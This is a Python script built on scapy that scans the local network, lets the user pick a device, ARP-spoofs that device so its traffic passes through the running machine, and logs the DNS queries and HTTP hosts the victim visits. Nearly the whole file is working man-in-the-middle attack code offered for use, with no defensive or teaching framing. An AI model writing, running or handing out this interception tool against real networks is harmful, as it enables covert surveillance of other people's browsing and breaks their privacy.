from scapy.all import ARP, Ether, srp, send, sniff, DNS, DNSQR, IP, TCP, Raw
import os
import time
import netifaces
import threading

# Function to get the network subnet
def get_network_subnet():
    interfaces = netifaces.interfaces()
    for iface in interfaces:
        addrs = netifaces.ifaddresses(iface)
        if netifaces.AF_INET in addrs:  # Look for IPv4 addresses
            ip_info = addrs[netifaces.AF_INET][0]
            ip_addr = ip_info['addr']
            netmask = ip_info['netmask']
            subnet = calculate_subnet(ip_addr, netmask)
            return subnet, ip_addr  # Return subnet and local IP address
    return None, None

# Calculate the subnet based on IP address and netmask
def calculate_subnet(ip, netmask):
    ip_parts = ip.split('.')
    mask_parts = netmask.split('.')
    subnet_parts = [str(int(ip_parts[i]) & int(mask_parts[i])) for i in range(4)]
    subnet = '.'.join(subnet_parts) + '/' + str(sum([bin(int(x)).count('1') for x in mask_parts]))
    return subnet

# Scan the network for active devices
def scan_network(subnet):
    print(f"Scanning the network {subnet}...")
    devices = []
    
    arp_request = ARP(pdst=subnet)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    
    for sent, received in answered_list:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})
    
    return devices

# Display the list of devices
def display_devices(devices):
    print("Available devices on the network:")
    for i, device in enumerate(devices):
        print(f"{i+1}. IP: {device['ip']}, MAC: {device['mac']}")

# ARP spoofing to route traffic through the ARP proxy
def arp_spoof(target_ip, target_mac, gateway_ip, arp_device_mac):
    arp_reply = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=arp_device_mac)
    try:
        print(f"ARP spoofing {target_ip} to route traffic through this device...")
        while True:
            send(arp_reply, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("ARP spoofing stopped.")
        restore_arp(target_ip, gateway_ip)

# Restore the ARP table to its original state
def restore_arp(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    if target_mac and gateway_mac:
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=5)
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=5)
    print("ARP table restored.")

# Get the MAC address of a given IP address
def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    
    return answered_list[0][1].hwsrc if answered_list else None

# Sniff network packets and display activity (DNS and HTTP)
def log_device_traffic(selected_device_ip):
    print(f"Logging traffic from {selected_device_ip}...")

    def packet_callback(packet):
        if packet.haslayer(DNS) and packet.haslayer(DNSQR):
            dns_query = packet[DNSQR].qname.decode('utf-8')
            print(f"[DNS] {packet[IP].src} queried {dns_query}")
        
        elif packet.haslayer(TCP) and packet.haslayer(Raw):
            payload = packet[Raw].load.decode(errors="ignore")
            if "Host:" in payload:
                host_line = [line for line in payload.splitlines() if "Host:" in line]
                if host_line:
                    host = host_line[0].split(" ")[1]
                    print(f"[HTTP] {packet[IP].src} visited {host}")

    sniff(filter=f"ip src {selected_device_ip}", prn=packet_callback, store=False)

# Automatically get the gateway IP using netifaces
def get_gateway_ip():
    gateways = netifaces.gateways()
    return gateways['default'][netifaces.AF_INET][0]

# Main function to scan the network and ARP spoof selected devices
def main():
    # Automatically get the network subnet and ARP device IP
    subnet, arp_device_ip = get_network_subnet()
    if not subnet or not arp_device_ip:
        print("Could not automatically determine the network subnet.")
        return
    
    print(f"Detected local IP: {arp_device_ip}")
    print(f"Detected network subnet: {subnet}")
    
    # Scan the network for devices
    devices = scan_network(subnet)
    if not devices:
        print("No devices found on the network.")
        return

    # Display available devices
    display_devices(devices)

    # Ask if the user wants to manually enter an IP address
    choice = input("Enter 'm' to manually input an IP address, or choose a device number: ").strip().lower()
    
    if choice == 'm':
        target_ip = input("Enter the IP address you want to ARP spoof: ").strip()
        target_mac = get_mac(target_ip)
        if not target_mac:
            print(f"Could not find the MAC address for {target_ip}.")
            return
    else:
        selected_device = devices[int(choice) - 1]
        target_ip = selected_device['ip']
        target_mac = selected_device['mac']

    # Automatically get the gateway IP
    gateway_ip = get_gateway_ip()
    gateway_mac = get_mac(gateway_ip)

    if not gateway_mac:
        print("Could not find the gateway MAC address.")
        return

    # Get the MAC address of the ARP proxy device (your device)
    arp_device_mac = get_mac(arp_device_ip)

    # Start ARP spoofing in the background
    spoofing_thread = threading.Thread(target=arp_spoof, args=(target_ip, target_mac, gateway_ip, arp_device_mac))
    spoofing_thread.start()

    # Log all network requests from the selected device
    log_device_traffic(target_ip)

if __name__ == "__main__":
    main()
